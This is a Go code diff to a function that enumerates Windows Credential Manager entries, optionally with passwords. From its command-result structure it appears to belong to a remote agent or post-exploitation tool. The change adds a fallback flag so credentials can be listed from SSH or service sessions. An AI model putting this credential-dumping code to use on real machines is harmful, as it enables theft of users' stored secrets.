@@ -105,25 +105,35 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 		filterPtr = uintptr(unsafe.Pointer(filterUTF16))
 	}
 
+	// Try with flags=0 first, then flags=1 (CRED_ENUMERATE_ALL_CREDENTIALS)
+	// for non-interactive sessions (SSH, services)
 	r, _, err := procCredEnumerateW.Call(
 		filterPtr,
-		0, // flags must be 0
+		0, // standard enumeration
 		uintptr(unsafe.Pointer(&count)),
 		uintptr(unsafe.Pointer(&credArray)),
 	)
 	if r == 0 {
-		// Check for "no credentials" error
-		if err == windows.ERROR_NOT_FOUND {
+		// Try with CRED_ENUMERATE_ALL_CREDENTIALS flag for non-interactive sessions
+		r, _, err = procCredEnumerateW.Call(
+			0, // filter must be NULL when using flag 1
+			1, // CRED_ENUMERATE_ALL_CREDENTIALS
+			uintptr(unsafe.Pointer(&count)),
+			uintptr(unsafe.Pointer(&credArray)),
+		)
+		if r == 0 {
+			if err == windows.ERROR_NOT_FOUND {
+				return structs.CommandResult{
+					Output:    "No credentials found in Credential Manager",
+					Status:    "success",
+					Completed: true,
+				}
+			}
 			return structs.CommandResult{
-				Output:    "No credentials found in Credential Manager",
-				Status:    "success",
+				Output:    fmt.Sprintf("CredEnumerateW failed: %v\n\nNote: Credential Manager enumeration requires the user to have an interactive logon session. If running via SSH or as a service, try running from a GUI session.", err),
+				Status:    "error",
 				Completed: true,
 			}
-		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CredEnumerateW failed: %v", err),
-			Status:    "error",
-			Completed: true,
 		}
 	}
 	defer procCredFree.Call(credArray)
